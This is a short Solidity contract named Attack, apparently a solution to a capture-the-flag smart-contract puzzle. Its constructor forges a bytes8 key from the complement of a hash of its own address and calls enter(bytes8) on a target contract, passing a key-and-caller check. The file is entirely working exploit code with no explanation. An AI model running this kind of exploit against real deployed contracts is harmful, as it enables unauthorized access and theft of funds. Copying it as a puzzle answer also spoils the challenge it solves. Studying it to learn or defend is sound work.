// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address public target;

    
    constructor(address _target){
        target = _target;
        uint64 temp = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        target.call(abi.encodeWithSignature("enter(bytes8)", bytes8(temp)));
    }

    
}